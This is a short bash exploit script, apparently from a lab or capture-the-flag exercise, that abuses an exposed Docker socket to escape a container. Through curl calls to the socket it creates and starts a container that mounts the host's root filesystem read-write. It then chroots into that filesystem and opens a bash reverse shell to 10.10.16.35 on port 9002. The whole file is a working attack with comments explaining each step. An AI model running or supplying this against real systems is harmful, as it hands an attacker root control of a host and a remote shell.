#!/bin/bash

# you can see images availables with
# curl -s --unix-socket /app/docker.sock http://localhost/images/json
# here we have sandbox:latest

# command executed when container is started
# change dir to tmp where the root fs is mount and execute reverse shell

cmd="[\"/bin/sh\",\"-c\",\"chroot /tmp sh -c \\\"bash -c 'bash -i &>/dev/tcp/10.10.16.35/9002 0<&1'\\\"\"]"

# create the container and execute command, bind the root filesystem to it, name the container peterpwn_root and execute as detached (-d)
curl -s -X POST --unix-socket /app/docker.sock -d "{\"Image\":\"laravel-app_main\",\"cmd\":$cmd,\"Binds\":[\"/:/tmp:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create?name=laravel-app_main

# start the container
curl -s -X POST --unix-socket /app/docker.sock "http://localhost/containers/laravel-app_main/start"